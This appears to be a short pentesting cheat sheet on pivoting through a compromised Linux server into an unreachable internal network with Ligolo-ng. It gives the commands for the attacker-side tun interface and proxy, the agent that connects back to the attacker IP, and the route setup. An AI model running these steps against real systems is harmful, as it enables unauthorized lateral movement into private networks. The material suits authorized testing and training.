## Scenario

- You have compromised Linux Server
- Linux Server have access to another network that your attacker machine can't access
- We will setup a Tunnel using Ligolo-ng proxy and agent for forwarding traffic to unaccessible internal network

## Required Components

- Shell Access on the compromised Linux Server

---

1. Download Ligolo-ng proxy and agent binary from following Github Repo

```bash
https://github.com/nicocha30/ligolo-ng/releases/tag/v0.8.2
```

2. Extract both agent and proxy and transfer agent Binary to compromised Linux Server

```bash
tar -xvzf <downloaded agent and proxy files>
```
- Start python webserver for file transfer
```bash
python3 -m http.server 80
```

3. On Attacker Machine create an Interface

```bash
ip tuntap add user root mode tun ligolo
```
```bash
ip link set ligolo up
```

4. Start Proxy on Attacker Machine

```bash
chmod +x proxy
```
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

5. On Compromised Linux Server

```bash
./agent -connect <Attacker Machine IP>:443 -ignore-cert
```
6. On Attacker Machine on a new terminal add route to internal unaccessible network

```bash
ip route add <Internal Subnet/CIDR>
```

7. On Attacker machine from terminal windows where you ran the proxy command ( Refer Step 4 )

```bash
session
```
```bash
Select Correct agent session and press enter
```
```bash
start
```
